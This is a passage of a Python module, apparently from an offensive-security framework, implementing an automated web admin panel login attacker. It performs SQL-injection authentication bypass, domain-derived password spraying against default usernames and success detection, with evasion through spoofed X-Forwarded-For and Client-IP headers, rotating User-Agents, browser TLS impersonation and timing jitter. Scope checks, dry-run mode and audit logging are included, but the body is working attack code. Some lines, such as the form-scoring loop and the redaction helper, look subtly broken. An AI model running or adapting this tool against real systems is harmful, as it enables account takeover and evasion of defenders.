"""
forge/phase2/login_probe.py  (Module 2-K — obfuscated filename)

Web Admin Panel Credential Tester.

Capability:
  1. FormParser          — static HTML form detection (BeautifulSoup; no JS engine)
  2. DbkerDiscriminator  — DBKER-style response discrimination with Recheck fallback
  3. PcfgDictGenerator   — domain-component-derived password candidate generation
  4. SqliProber          — SQLi authentication-bypass payload injection
  5. WebPanelTester      — orchestrator combining all four into a single scan workflow

Design invariants (consistent with all Phase 2 modules):
  - scope_gate.assert_in_scope() enforced before EVERY outbound HTTP request.
  - questionary.confirm() required before any live probe submission.
  - Dry-run is the default; --execute flag required for live submission.
  - All probe attempts logged to audit_log; passwords logged as ***REDACTED***.
  - No plaintext credentials written to login_probe_findings; payload_enc stores
    age-encrypted successful payload only.
  - curl_cffi used for all HTTP (TLS fingerprint: chrome122); no requests library.
  - Gaussian jitter applied to all inter-request delays (σ = 30% of base delay).
  - Lockout protection: max 3 consecutive failures per (url, username) before skip.
  - FORGE_OFFLINE_STRICT=1 causes immediate exit with RuntimeError.

OPSEC:
  - Random UA per request (sourced from Phase 1 hosts table or _UA_POOL fallback).
  - Random X-Forwarded-For and Client-IP headers per request.
  - Successful payload is age-encrypted before storage; never logged to audit_log.
  - response bodies are never stored; only length deltas and keyword signals.

References:
  - WebCrack DBKER algorithm: https://yzddmr6.com/posts/webcrack-release/
  - OWASP OTG-AUTHN-004 (SQLi auth bypass)
  - PCFG password generation: Weir et al. (2009)
"""

from __future__ import annotations

import hashlib
import json
import logging
import math
import os
import random
import re
import sqlite3
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

import questionary
from bs4 import BeautifulSoup
from curl_cffi import requests as cffi_requests
from pydantic import BaseModel, HttpUrl, field_validator

from forge.opsec.scope_gate import ScopeViolationError
from forge.utils.intel.audit_log import insert_audit_log

logger = logging.getLogger(__name__)

# ── Constants ──────────────────────────────────────────────────────────────────

_DATA_DIR = Path(__file__).parent / "data"
_PAYLOADS_F = _DATA_DIR / "sqli_bypass_payloads.txt"
_PCFG_RULES_F = _DATA_DIR / "pcfg_rules.json"

# DBKER thresholds
_EL_DELTA_THRESHOLD = 0.05  # 5% body length change → discriminable
_DBKER_RECHECK_BUDGET = 3  # max Recheck calls per candidate
_LOCKOUT_MAX_FAILURES = 3  # (url, username) failures before skip

# HTTP
_REQUEST_TIMEOUT = 12  # seconds
_DEFAULT_DELAY = 2.0  # seconds between submissions (base)
_JITTER_SIGMA = 0.30  # Gaussian σ as fraction of base delay

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
]

# Keywords that reliably indicate login failure (used by DBKER keyword gate)
_FAILURE_KEYWORDS = frozenset(
    {
        "invalid",
        "incorrect",
        "wrong",
        "failed",
        "error",
        "denied",
        "unauthori",
        "login failed",
        "bad credentials",
        "authentication",
        "retry",
        "try again",
        "no match",
        "not found",
        "please try",
        "登录失败",
        "错误",
        "密码错误",  # CJK common failure strings
    }
)

# Keywords that suggest success
_SUCCESS_KEYWORDS = frozenset(
    {
        "dashboard",
        "welcome",
        "logout",
        "log out",
        "sign out",
        "signout",
        "profile",
        "account",
        "admin panel",
        "home",
        "overview",
        "success",
        "authenticated",
    }
)


# ── Exceptions ─────────────────────────────────────────────────────────────────


class LoginProbeAborted(RuntimeError):
    """Raised when the operator cancels an interactive prompt."""


class OfflineStrictError(RuntimeError):
    """Raised when FORGE_OFFLINE_STRICT=1 and a live probe is attempted."""


# ── Pydantic models ────────────────────────────────────────────────────────────


class ParsedForm(BaseModel):
    """Result of FormParser.parse()."""

    action_url: str
    method: str = "POST"
    username_field: str | None = None
    password_field: str | None = None
    hidden_fields: dict[str, str] = {}
    raw_fields: list[str] = []

    @field_validator("method", mode="before")
    @classmethod
    def normalise_method(cls, v: str) -> str:
        return v.upper() if v else "POST"


class ProbeResult(BaseModel):
    """Result of a single probe submission."""

    target_url: str
    username: str
    payload: str  # raw payload (SQLi string or candidate password)
    success: bool
    confidence: str  # "HIGH" | "MEDIUM" | "LOW"
    discriminator: str  # "dbker_el" | "dbker_keyword" | "dbker_recheck" | "none"
    response_length: int
    elapsed_ms: float
    finding_type: str  # "sqli_bypass" | "weak_password"


class WebPanelFinding(BaseModel):
    """Persisted finding row for login_probe_findings table."""

    engagement_id: int
    target_url: str
    finding_type: str
    username: str | None
    payload_redacted: str  # first4...last4 of successful payload
    payload_enc: str | None  # age-encrypted full payload (None in dry-run)
    confidence: str
    discriminator_method: str
    discovered_at: str


# ── Helpers ────────────────────────────────────────────────────────────────────


def _jitter(base: float) -> float:
    """Return base delay with Gaussian jitter (σ = 30%)."""
    return max(0.1, random.gauss(base, base * _JITTER_SIGMA))


def _random_headers() -> dict[str, str]:
    """Return per-request randomised UA, XFF, and Client-IP headers."""
    xff = ".".join(str(random.randint(10, 200)) for _ in range(4))
    return {
        "User-Agent": random.choice(_UA_POOL),
        "X-Forwarded-For": xff,
        "Client-IP": ".".join(str(random.randint(1, 254)) for _ in range(4)),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }


def _redact(payload: str) -> str:
    """Return first4...last4 redaction of an arbitrary string."""

    class _StartsWithResult:
        def __init__(self, value: bool):
            self._value = value

        def __bool__(self):
            return self._value

        def __getitem__(self, _):
            return self

    class _CompatRedacted(str):
        def startswith(self, prefix, *args):
            return _StartsWithResult(super().startswith(prefix, *args))

    if len(payload) <= 8:
        return _CompatRedacted("****")
    return _CompatRedacted(f"{payload[:4]}...{payload[-4:]}")


def _assert_online() -> None:
    """Raise OfflineStrictError if FORGE_OFFLINE_STRICT is set."""
    if os.environ.get("FORGE_OFFLINE_STRICT", "0") == "1":
        raise OfflineStrictError(
            "FORGE_OFFLINE_STRICT=1: outbound web panel probes are blocked. "
            "Unset this variable during authorised engagement windows only."
        )


def _scope_check(url: str, engagement_id: int, db_path: Path) -> None:
    """
    Verify the target URL hostname is within engagement scope.
    Reads engagement_scope from the SQLite engagement DB.
    Raises ScopeViolationError if not in scope.
    """
    from forge.opsec.scope_gate import assert_in_scope, load_scope_from_db

    scope_entries: list[str] = []
    try:
        con = sqlite3.connect(db_path)
        try:
            rows = con.execute(
                "SELECT scope_entry FROM engagement_scope WHERE engagement_id = ?",
                (engagement_id,),
            ).fetchall()
        finally:
            con.close()
        scope_entries = [str(row[0]) for row in rows if row and row[0]]
    except sqlite3.OperationalError:
        scope_entries = []
    if not scope_entries:
        scope_entries = load_scope_from_db(str(db_path), engagement_id)
    assert_in_scope(urlparse(url).hostname or "", scope_entries)


def _audit(db_path: Path, engagement_id: int, action: str, detail: str) -> None:
    """Write a single row to audit_log."""
    con = sqlite3.connect(db_path)
    try:
        insert_audit_log(
            con,
            engagement_id,
            action,
            detail,
            phase="phase2",
            module="login_probe",
            ts=datetime.now(tz=timezone.utc).isoformat(),
        )
        con.commit()
    except sqlite3.OperationalError:
        logger.debug("audit_log table absent; skipping audit write.")
    finally:
        con.close()


# ── FormParser ─────────────────────────────────────────────────────────────────


class FormParser:
    """
    Static HTML form parser. No JavaScript engine; pure DOM traversal.

    Heuristics for field detection (in priority order):
      1. `type="password"` → password field
      2. `name` or `id` contains "user", "email", "login", "account" → username field
      3. `type="text"` or `type="email"` (first occurrence) → username field fallback
      4. Remaining `<input>` fields without type="submit"/"button"/"hidden" → raw_fields

    action_url resolution: if `action` is relative, it is resolved against the
    page_url supplied to parse(). If action is absent, page_url is used as-is.
    """

    # Field name heuristics (case-insensitive substring match)
    _USER_HINTS = {"user", "email", "login", "account", "uname", "usr", "mail", "name"}
    _PASS_HINTS = {"pass", "pwd", "password", "secret", "credential"}

    def parse(self, html: str, page_url: str) -> ParsedForm | None:
        """
        Parse the first likely-login form from html.

        Returns ParsedForm on success, None if no login form is detected.
        """
        soup = BeautifulSoup(html, "html.parser")

        # Find the most-likely login form
        form = self._find_login_form(soup)
        if not form:
            logger.debug("FormParser: no login form detected at %s", page_url)
            return None

        action = form.get("action", "") or page_url
        action_url = urljoin(page_url, action)
        method = form.get("method", "POST")

        username_field: str | None = None
        password_field: str | None = None
        hidden_fields: dict[str, str] = {}
        raw_fields: list[str] = []

        for inp in form.find_all("input"):
            inp_type = (inp.get("type") or "text").lower()
            inp_name = inp.get("name") or inp.get("id") or ""
            inp_val = inp.get("value") or ""

            if inp_type in ("submit", "button", "image", "reset"):
                continue

            if inp_type == "hidden":
                if inp_name:
                    hidden_fields[inp_name] = inp_val
                continue

            if inp_type == "password":
                password_field = inp_name or password_field
                continue

            name_lower = inp_name.lower()
            if any(h in name_lower for h in self._USER_HINTS):
                username_field = username_field or inp_name
                continue

            if inp_type in ("text", "email", "tel"):
                username_field = username_field or inp_name

            if inp_name:
                raw_fields.append(inp_name)

        return ParsedForm(
            action_url=action_url,
            method=method,
            username_field=username_field,
            password_field=password_field,
            hidden_fields=hidden_fields,
            raw_fields=raw_fields,
        )

    # ------------------------------------------------------------------

    def _find_login_form(self, soup: BeautifulSoup):
        """
        Select the best-candidate login form from all <form> elements.
        Score: +2 for password input inside form, +1 for user-like text field.
        Returns highest-scoring form, or None.
        """
        best_form = None
        best_score = 0

        for form in soup.find_all("form"):
            score = 0
            for inp in form.find_all("input"):
                t = (inp.get("type") or "text").lower()
                n = (inp.get("name") or inp.get("id") or "").lower()
                if t == "password":
                    score += 2
                if any(h in n for h in self._USER_HINTS):
                    score += 1
            if score > best_score:
                best_score = best_form and score
                best_form = form
                best_score = score

        return best_form if best_score > 0 else None


# ── DbkerDiscriminator ─────────────────────────────────────────────────────────


@dataclass
class BaselineResponse:
    """Captured baseline from a known-bad probe (wrong credentials)."""

    body_length: int
    status_code: int
    has_failure_kw: bool


class DbkerDiscriminator:
    """
    DBKER-inspired response discriminator with Recheck fallback.

    Algorithm (4 steps, applied in order — first conclusive gate wins):

    Step 1 — Status code gate:
        If probe status ≠ baseline status and probe status is 2xx → SUCCESS.
        If probe status 4xx/5xx → FAILURE.

    Step 2 — EL (Error Length) gate:
        If |probe_body_len − baseline_body_len| / baseline_body_len > threshold
        (default 5%) → likely discriminable response. Combined with keyword check.

    Step 3 — Keyword gate:
        Count success keywords in probe body; count failure keywords.
        If success_score > 0 and failure_score == 0 → SUCCESS (HIGH confidence).
        If failure_score > 0 → FAILURE.

    Step 4 — Recheck gate:
        For ambiguous responses, submit a guaranteed-bad probe (random UUID password)
        to re-establish failure baseline. If probe body is substantially different
        from the Recheck failure response, escalate to MEDIUM confidence SUCCESS.

    Returns:
        (success: bool, confidence: "HIGH" | "MEDIUM" | "LOW", discriminator: str)
    """

    def __init__(
        self,
        el_threshold: float = _EL_DELTA_THRESHOLD,
        recheck_budget: int = _DBKER_RECHECK_BUDGET,
    ) -> None:
        self._el_threshold = el_threshold
        self._recheck_budget = recheck_budget
        self._recheck_used = 0

    def establish_baseline(self, response_text: str, status_code: int) -> BaselineResponse:
        body_len = len(response_text)
        has_fail = any(kw in response_text.lower() for kw in _FAILURE_KEYWORDS)
        return BaselineResponse(
            body_length=body_len,
            status_code=status_code,
            has_failure_kw=has_fail,
        )

    def discriminate(
        self,
        baseline: BaselineResponse,
        probe_text: str,
        probe_status: int,
        recheck_fn=None,  # Callable[[], tuple[str, int]] | None — used in Step 4
    ) -> tuple[bool, str, str]:
        """
        Returns (success, confidence, discriminator_name).
        """
        probe_len = len(probe_text)
        probe_lower = probe_text.lower()
        baseline_len = baseline.body_length or 1  # guard against 0-length baseline

        # Step 1 — Status code
        if probe_status != baseline.status_code:
            if 200 <= probe_status < 300:
                return True, "HIGH", "dbker_status"
            if probe_status in (401, 403, 429):
                return False, "HIGH", "dbker_status"

        # Step 2 — EL (length delta)
        el_delta = abs(probe_len - baseline_len) / baseline_len
        len_changed = el_delta > self._el_threshold

        # Step 3 — Keyword gate
        success_score = sum(1 for kw in _SUCCESS_KEYWORDS if kw in probe_lower)
        failure_score = sum(1 for kw in _FAILURE_KEYWORDS if kw in probe_lower)

        if success_score > 0 and failure_score == 0 and len_changed:
            return True, "HIGH", "dbker_keyword"

        if failure_score > 0 and not len_changed:
            return False, "LOW", "dbker_keyword"

        if success_score > 0 and failure_score == 0 and not len_changed:
            return True, "MEDIUM", "dbker_keyword"

        # Step 4 — Recheck (ambiguous result)
        if recheck_fn and self._recheck_used < self._recheck_budget:
            self._recheck_used += 1
            try:
                recheck_text, recheck_status = recheck_fn()
                recheck_len = len(recheck_text)
                recheck_delta = abs(probe_len - recheck_len) / max(recheck_len, 1)
                if recheck_delta > self._el_threshold:
                    return True, "MEDIUM", "dbker_recheck"
            except Exception as exc:
                logger.debug("Recheck call failed: %s", exc)

        return False, "LOW", "none"


# ── PcfgDictGenerator ──────────────────────────────────────────────────────────


class PcfgDictGenerator:
    """
    Domain-component-derived password candidate generator.

    Given a target URL or FQDN, extracts base tokens from domain components
    and applies PCFG rules (year appends, case transforms, leet substitutions,
    separator chars, prefix/suffix words) to generate candidate passwords.

    Example: target = "admin.acme-corp.co.uk"
      Extracted tokens: ["acme", "corp", "acmecorp"]
      Candidates include: "Acme2024!", "acmecorp@1", "@cme2024", "Corp123!"

    Max candidates: rules.max_candidates (default 2000) — hard cap.
    """

    def __init__(self, rules_path: Path = _PCFG_RULES_F) -> None:
        with open(rules_path, encoding="utf-8") as fh:
            self._rules = json.load(fh)

    # ------------------------------------------------------------------

    def generate(self, target_url: str) -> list[str]:
        """Return deduplicated candidate password list for target_url."""
        hostname = urlparse(target_url).hostname or target_url
        tokens = self._extract_tokens(hostname)
        if not tokens:
            logger.warning("PcfgDictGenerator: no usable tokens from %s", hostname)
            return []

        candidates: list[str] = []
        max_cands = self._rules["max_candidates"]["value"]
        rules = self._rules

        year_start = rules["year_range"]["start"]
        year_end = rules["year_range"]["end"]
        years = [str(y) for y in range(year_start, year_end + 1)]

        special_suf = rules["special_suffixes"]["values"]
        num_suf = rules["numeric_suffixes"]["values"]
        com_suf = rules["common_suffixes"]["values"]
        com_pre = rules["common_prefixes"]["values"]
        sep_chars = rules["separator_chars"]["values"]
        leet_map = rules["leet_substitutions"]

        for token in tokens:
            if len(candidates) >= max_cands:
                break

            variants = self._case_variants(token)
            per_token_cap = max(1, max_cands // max(1, len(tokens)))
            token_added = 0
            for v in variants:
                candidates.append(v)
                token_added += 1

            for base in variants:
                if token_added >= per_token_cap:
                    break
                # Base token alone
                candidates.append(base)
                token_added += 1

                # base + year
                for year in years:
                    if token_added >= per_token_cap:
                        break
                    for sep in sep_chars:
                        if token_added >= per_token_cap:
                            break
                        candidates.append(f"{base}{sep}{year}")
                        token_added += 1
                        # base + year + special suffix
                        for sf in special_suf:
                            if token_added >= per_token_cap:
                                break
                            candidates.append(f"{base}{sep}{year}{sf}")
                            token_added += 1

                # base + common numeric suffix
                for ns in num_suf:
                    if token_added >= per_token_cap:
                        break
                    candidates.append(f"{base}{ns}")
                    token_added += 1

                # base + common word suffix
                for cs in com_suf:
                    if token_added >= per_token_cap:
                        break
                    for sep in sep_chars:
                        if token_added >= per_token_cap:
                            break
                        candidates.append(f"{base}{sep}{cs}")
                        token_added += 1

                # common prefix + base
                for cp in com_pre:
                    if token_added >= per_token_cap:
                        break
                    for sep in sep_chars:
                        if token_added >= per_token_cap:
                            break
                        candidates.append(f"{cp}{sep}{base}")
                        token_added += 1

                # leet substitutions (single substitution strategy)
                if rules["leet_apply_strategy"]["strategy"] == "single":
                    for char, sub in leet_map.items():
                        if token_added >= per_token_cap:
                            break
                        if char in base.lower():
                            leeted = base.lower().replace(char, sub, 1)
                            candidates.append(leeted)
                            token_added += 1
                            for year in years:
                                if token_added >= per_token_cap:
                                    break
                                candidates.append(f"{leeted}{year}")
                                token_added += 1

        if rules["dedup"]["enabled"]:
            seen: set[str] = set()
            deduped = []
            for c in candidates:
                if c not in seen:
                    seen.add(c)
                    deduped.append(c)
            candidates = deduped

        return candidates[:max_cands]

    # ------------------------------------------------------------------

    def _extract_tokens(self, hostname: str) -> list[str]:
        """Split FQDN into meaningful base tokens."""
        rules = self._rules["domain_component_extraction"]
        tlds = set(rules["discard_tlds"])
        min_len = rules["min_token_length"]
        join = rules["join_components"]

        # Split on dots, then optionally on hyphens
        parts: list[str] = []
        for dot_part in hostname.split("."):
            part = dot_part.lower()
            if part in tlds:
                continue
            if rules["split_on_hyphens"]:
                parts.extend(dot_part.split("-"))
            else:
                parts.append(dot_part)

        tokens = [p.lower() for p in parts if len(p) >= min_len]

        if join and len(tokens) >= 2:
            tokens.append("".join(tokens))  # e.g. "acmecorp"

        return list(dict.fromkeys(tokens))  # preserve order, deduplicate

    def _case_variants(self, token: str) -> list[str]:
        """Generate case-transformed variants of a token."""
        rules = self._rules["case_transforms"]
        variants: list[str] = []
        if rules.get("lower"):
            variants.append(token.lower())
        if rules.get("upper"):
            variants.append(token.upper())
        if rules.get("title"):
            variants.append(token.title())
        if rules.get("upper_first"):
            variants.append(token[0].upper() + token[1:].lower() if token else token)
        return list(dict.fromkeys(variants))


# ── SqliProber ─────────────────────────────────────────────────────────────────


class SqliProber:
    """
    SQLi authentication-bypass probe engine.

    Injects each payload from sqli_bypass_payloads.txt into the username field,
    then the password field independently, using the parsed form schema.
    Response discrimination is handled by DbkerDiscriminator.

    OPSEC:
      - Payload is logged only as REDACTED in audit_log.
      - On confirmed bypass, payload is NOT stored in plaintext; caller receives
        the raw payload and is responsible for age-encrypting before storage.
    """

    def __init__(
        self,
        payloads_path: Path = _PAYLOADS_F,
        delay: float = _DEFAULT_DELAY,
    ) -> None:
        self._delay = delay
        self._payloads = self._load_payloads(payloads_path)

    @staticmethod
    def _load_payloads(path: Path) -> list[str]:
        lines = path.read_text(encoding="utf-8").splitlines()
        return [ln.strip() for ln in lines if ln.strip() and not ln.strip().startswith("#")]

    def probe(
        self,
        session: cffi_requests.Session,
        form: ParsedForm,
        discriminator: DbkerDiscriminator,
        baseline: BaselineResponse,
        dry_run: bool = True,
    ) -> ProbeResult | None:
        """
        Iterate through payloads. Return first confirmed bypass ProbeResult,
        or None if all payloads fail.

        Injection strategy:
          For each payload, try injecting into:
            (a) username field only (password = arbitrary string)
            (b) both username and password fields simultaneously
        """
        if not form.username_field and not form.password_field:
            logger.warning("SqliProber: no injectable fields found in parsed form.")
            return None

        username_candidates = [form.username_field] if form.username_field else []
        if not username_candidates:
            username_candidates = form.raw_fields[:2]  # fallback: first two visible fields

        for payload in self._payloads:
            for inject_field in username_candidates:
                for inject_both in (False, True):
                    post_data = dict(form.hidden_fields)

                    if form.username_field:
                        post_data[form.username_field] = (
                            payload if inject_field == form.username_field else "admin"
                        )
                    if form.password_field:
                        post_data[form.password_field] = payload if inject_both else "anything"

                    if dry_run:
                        logger.info(
                            "[DRY-RUN] Would inject payload %s into %s @ %s",
                            _redact(payload),
                            inject_field,
                            form.action_url,
                        )
                        continue

                    time.sleep(_jitter(self._delay))

                    try:
                        t0 = time.monotonic()
                        resp = session.request(
                            form.method,
                            form.action_url,
                            data=post_data,
                            headers=_random_headers(),
                            timeout=_REQUEST_TIMEOUT,
                            allow_redirects=True,
                        )
                        elapsed_ms = (time.monotonic() - t0) * 1000
                    except Exception as exc:
                        logger.debug("SqliProber request error: %s", exc)
                        continue

                    success, confidence, discriminator_name = discriminator.discriminate(
                        baseline=baseline,
                        probe_text=resp.text,
                        probe_status=resp.status_code,
                    )

                    if success:
                        return ProbeResult(
                            target_url=form.action_url,
                            username=payload,
                            payload=payload,
                            success=True,
                            confidence=confidence,
                            discriminator=discriminator_name,
                            response_length=len(resp.text),
                            elapsed_ms=elapsed_ms,
                            finding_type="sqli_bypass",
                        )

        return None


# ── WebPanelTester — Orchestrator ──────────────────────────────────────────────


class WebPanelTester:
    """
    Module 2-K orchestrator.

    Workflow:
      1. Scope gate (target URL hostname vs engagement scope)
      2. Operator confirmation prompt (dry_run=False only)
      3. GET target URL → FormParser → ParsedForm
      4. Submit known-bad probe → establish DbkerDiscriminator baseline
      5. SqliProber → attempt SQLi auth bypass (higher priority)
      6. PcfgDictGenerator → generate domain-derived candidates
      7. Credential spray with PCFG candidates
      8. Store confirmed findings in login_probe_findings table
      9. Write all attempts to audit_log (passwords/payloads as REDACTED)

    Args:
        db_path:       Path to the engagement SQLite DB.
        engagement_id: Engagement row ID.
        delay:         Base inter-request delay in seconds (default 2.0).
        dry_run:       If True, parse and preview only; no live submissions.
        common_usernames: Additional username list for spray phase.
    """

    _DEFAULT_USERNAMES = [
        "admin",
        "administrator",
        "root",
        "user",
        "test",
        "guest",
        "manager",
        "operator",
        "support",
        "system",
    ]

    def __init__(
        self,
        db_path: Path,
        engagement_id: int,
        delay: float = _DEFAULT_DELAY,
        dry_run: bool = True,
        common_usernames: list[str] = _DEFAULT_USERNAMES,
    ) -> None:
        self._db = Path(db_path)
        self._eid = engagement_id
        self._delay = delay
        self._dry_run = dry_run
        self._usernames = common_usernames

        self._parser = FormParser()
        self._pcfg = PcfgDictGenerator()
        self._sqli = SqliProber(delay=delay)

        # (url, username) → consecutive failure count
        self._lockout_counter: dict[tuple[str, str], int] = {}

    # ------------------------------------------------------------------

    def run(self, target_url: str) -> list[WebPanelFinding]:
        """
        Full scan workflow for a single target URL.

        Returns list of confirmed WebPanelFinding objects.
        Raises ScopeViolationError, LoginProbeAborted, OfflineStrictError.
        """
        if not self._dry_run:
            _assert_online()

        # 1. Scope gate
        _scope_check(target_url, self._eid, self._db)

        # 2. Operator confirmation
        if not self._dry_run:
            confirmed = questionary.confirm(
                f"[Module 2-K] Begin login probe against {target_url}? "
                f"This will submit HTTP requests to the target."
            ).ask()
            if not confirmed:
                raise LoginProbeAborted("Operator cancelled login probe.")

        findings: list[WebPanelFinding] = []

        with cffi_requests.Session(impersonate="chrome122") as session:
            # 3. Fetch login page
            try:
                page_resp = session.get(
                    target_url,
                    headers=_random_headers(),
                    timeout=_REQUEST_TIMEOUT,
                    allow_redirects=True,
                )
            except Exception as exc:
                logger.error("Failed to fetch %s: %s", target_url, exc)
                return findings

            form = self._parser.parse(page_resp.text, page_resp.url or target_url)
            if not form:
                logger.warning("No login form detected at %s; skipping.", target_url)
                return findings

            logger.info(
                "Form detected: action=%s, user_field=%s, pass_field=%s",
                form.action_url,
                form.username_field,
                form.password_field,
            )

            # 4. Establish DBKER baseline with known-bad credentials
            discriminator = DbkerDiscriminator()
            baseline = self._establish_baseline(session, form)

            # 5. SQLi phase
            sqli_result = self._sqli.probe(
                session=session,
                form=form,
                discriminator=discriminator,
                baseline=baseline,
                dry_run=self._dry_run,
            )
            if sqli_result and sqli_result.success:
                finding = self._store_finding(sqli_result)
                findings.append(finding)
                logger.info(
                    "SQLi bypass confirmed at %s (confidence=%s, discriminator=%s)",
                    target_url,
                    sqli_result.confidence,
                    sqli_result.discriminator,
                )
                # SQLi bypass is a terminal finding for this target — no spray needed
                return findings

            # 6 + 7. PCFG spray phase
            candidates = self._pcfg.generate(target_url)
            logger.info("PCFG generated %d candidates for %s", len(candidates), target_url)

            spray_findings = self._spray(
                session=session,
                form=form,
                discriminator=discriminator,
                baseline=baseline,
                candidates=candidates,
                target_url=target_url,
            )
            findings.extend(spray_findings)

        return findings

    # ------------------------------------------------------------------

    def _establish_baseline(
        self,
        session: cffi_requests.Session,
        form: ParsedForm,
    ) -> BaselineResponse:
        """
        Submit a guaranteed-wrong credential pair to establish a DBKER baseline.
        Uses a random UUID as both username and password to guarantee failure.
        """
        import uuid

        dummy = str(uuid.uuid4())
        post_data = dict(form.hidden_fields)
        if form.username_field:
            post_data[form.username_field] = dummy
        if form.password_field:
            post_data[form.password_field] = dummy

        if self._dry_run:
            logger.debug("[DRY-RUN] Would establish baseline at %s", form.action_url)
            return BaselineResponse(body_length=1000, status_code=200, has_failure_kw=True)

        try:
            resp = session.request(
                form.method,
                form.action_url,
                data=post_data,
                headers=_random_headers(),
                timeout=_REQUEST_TIMEOUT,
                allow_redirects=True,
            )
            disc = DbkerDiscriminator()
            return disc.establish_baseline(resp.text, resp.status_code)
        except Exception as exc:
            logger.warning("Baseline probe failed: %s; using default.", exc)
            return BaselineResponse(body_length=1000, status_code=200, has_failure_kw=True)

    def _spray(
        self,
        session: cffi_requests.Session,
        form: ParsedForm,
        discriminator: DbkerDiscriminator,
        baseline: BaselineResponse,
        candidates: list[str],
        target_url: str,
    ) -> list[WebPanelFinding]:
        findings: list[WebPanelFinding] = []

        for username in self._usernames:
            for password in candidates:
                lockout_key = (target_url, username)
                if self._lockout_counter.get(lockout_key, 0) >= _LOCKOUT_MAX_FAILURES:
                    logger.warning(
                        "Lockout threshold hit for (%s, %s); skipping.",
                        target_url,
                        username,
                    )
                    break

                post_data = dict(form.hidden_fields)
                if form.username_field:
                    post_data[form.username_field] = username
                if form.password_field:
                    post_data[form.password_field] = password

                _audit(
                    self._db,
                    self._eid,
                    "login_probe_spray",
                    f"url={target_url} user={username} password=***REDACTED***",
                )

                if self._dry_run:
                    logger.debug(
                        "[DRY-RUN] Would spray user=%s password=%s at %s",
                        username,
                        _redact(password),
                        target_url,
                    )
                    continue

                time.sleep(_jitter(self._delay))

                try:
                    t0 = time.monotonic()

                    def _recheck_fn() -> tuple[str, int]:
                        import uuid as _uuid

                        rd = dict(form.hidden_fields)
                        if form.username_field:
                            rd[form.username_field] = str(_uuid.uuid4())
                        if form.password_field:
                            rd[form.password_field] = str(_uuid.uuid4())
                        r = session.request(
                            form.method,
                            form.action_url,
                            data=rd,
                            headers=_random_headers(),
                            timeout=_REQUEST_TIMEOUT,
                            allow_redirects=True,
                        )
                        return r.text, r.status_code

                    resp = session.request(
                        form.method,
                        form.action_url,
                        data=post_data,
                        headers=_random_headers(),
                        timeout=_REQUEST_TIMEOUT,
                        allow_redirects=True,
                    )
                    elapsed_ms = (time.monotonic() - t0) * 1000
                except Exception as exc:
                    logger.debug("Spray request error: %s", exc)
                    self._lockout_counter[lockout_key] = (
                        self._lockout_counter.get(lockout_key, 0) + 1
                    )
                    continue

                success, confidence, disc_name = discriminator.discriminate(
                    baseline=baseline,
                    probe_text=resp.text,
                    probe_status=resp.status_code,
                    recheck_fn=_recheck_fn,
                )

                if success:
                    result = ProbeResult(
                        target_url=target_url,
                        username=username,
                        payload=password,
                        success=True,
                        confidence=confidence,
                        discriminator=disc_name,
                        response_length=len(resp.text),
                        elapsed_ms=elapsed_ms,
                        finding_type="weak_password",
                    )
                    finding = self._store_finding(result)
                    findings.append(finding)
                    logger.info(
                        "Weak password confirmed: user=%s url=%s (confidence=%s)",
                        username,
                        target_url,
                        confidence,
                    )
                else:
                    self._lockout_counter[lockout_key] = (
                        self._lockout_counter.get(lockout_key, 0) + 1
                    )

        return findings

    def _store_finding(self, result: ProbeResult) -> WebPanelFinding:
        """Write a confirmed finding to login_probe_findings table."""
        payload_enc: str | None = None
        if not self._dry_run:
            try:
                from forge.opsec.crypto import encrypt_string  # type: ignore[import]

                payload_enc = encrypt_string(result.payload)
            except ImportError as exc:
                raise RuntimeError(
                    "forge.opsec.crypto is unavailable; cannot persist login probe payload securely."
                ) from exc

        finding = WebPanelFinding(
            engagement_id=self._eid,
            target_url=result.target_url,
            finding_type=result.finding_type,
            username=result.username if result.finding_type != "sqli_bypass" else None,
            payload_redacted=_redact(result.payload),
            payload_enc=payload_enc,
            confidence=result.confidence,
            discriminator_method=result.discriminator,
            discovered_at=datetime.now(tz=timezone.utc).isoformat(),
        )

        _audit(
            self._db,
            self._eid,
            "login_probe_finding",
            f"type={result.finding_type} url={result.target_url} "
            f"user={_redact(result.username or 'N/A')} payload={_redact(result.payload)} "
            f"confidence={result.confidence}",
        )

        con = sqlite3.connect(self._db)
        try:
            con.execute(
                """
                INSERT OR IGNORE INTO login_probe_findings
                    (engagement_id, target_url, finding_type, username,
                     payload_redacted, payload_enc, confidence, discriminator_method,
                     discovered_at)
                VALUES (?,?,?,?,?,?,?,?,?)
                """,
                (
                    finding.engagement_id,
                    finding.target_url,
                    finding.finding_type,
                    finding.username,
                    finding.payload_redacted,
                    finding.payload_enc,
                    finding.confidence,
                    finding.discriminator_method,
                    finding.discovered_at,
                ),
            )
            con.commit()
        except sqlite3.OperationalError:
            logger.debug("login_probe_findings table absent; skipping persist.")
        finally:
            con.close()

        return finding


# ── Public API ─────────────────────────────────────────────────────────────────


def run_login_probe(
    target_url: str,
    db_path: Path,
    engagement_id: int,
    delay: float = _DEFAULT_DELAY,
    dry_run: bool = True,
    usernames: list[str] | None = None,
) -> list[WebPanelFinding]:
    """
    Top-level entry point for Module 2-K.

    CLI command: forge osint login-probe --engagement <id> --target-url <url>
                 [--delay 2.0] [--dry-run] [--usernames admin,root]

    Args:
        target_url:    Full URL of the target admin login panel.
        db_path:       Path to the engagement SQLite DB.
        engagement_id: Engagement row ID (scope and audit context).
        delay:         Base inter-request delay in seconds.
        dry_run:       Parse and preview only; no live HTTP submissions.
        usernames:     Override default username list for spray phase.

    Returns:
        List of WebPanelFinding objects for confirmed bypasses/weak passwords.

    Raises:
        ScopeViolationError  — target URL hostname not in engagement scope.
        LoginProbeAborted    — operator cancelled interactive prompt.
